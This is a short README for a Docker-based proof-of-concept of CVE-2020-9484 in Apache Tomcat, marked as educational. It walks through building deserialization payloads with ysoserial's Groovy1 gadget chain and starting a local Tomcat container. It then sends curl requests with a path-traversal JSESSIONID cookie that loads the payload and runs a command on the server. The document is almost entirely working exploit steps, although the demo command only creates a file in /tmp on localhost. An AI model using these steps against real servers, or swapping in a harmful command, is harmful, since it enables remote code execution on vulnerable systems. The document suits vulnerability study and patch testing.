# CVE-2020-9484 (Tomcat)

For educational purposes only.

See Reference for the details.


## Run
```
$ git clone https://github.com/Fisjkars/CVE-2020-9484.git
$ cd CVE-2020-9484
$ java -jar ysoserial.jar Groovy1 "touch /tmp/rce1.win" > groovy1.session
$ java -jar ysoserial.jar Groovy1 "touch /tmp/rce2.win" > groovy2.session
$ docker build -t tomcat:groovy .
$ docker run -d -p 8080:8080 tomcat:groovy
```

## Exploit
```
$ curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../../tomcat/sessions/malicious/donotverify/groovy1'
$ curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../../tomcat/sessionsOthers/malicious/donotverify/groovy2'
```

## Check
```
$ docker exec -it $CONTAINER /bin/sh
$ ls /tmp
```
